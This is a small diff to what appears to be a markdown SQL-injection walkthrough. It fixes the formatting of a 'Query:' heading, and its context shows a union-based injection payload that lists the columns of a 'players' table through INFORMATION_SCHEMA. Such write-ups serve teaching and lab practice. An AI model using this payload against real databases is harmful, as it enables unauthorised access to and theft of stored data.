@@ -114,8 +114,8 @@ Two tables, let’s look at them both:
 ```
 one
 ```
-**
-Query:**
+
+**Query:**
 ```mysql
 ' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_name='players';-- -
 ```
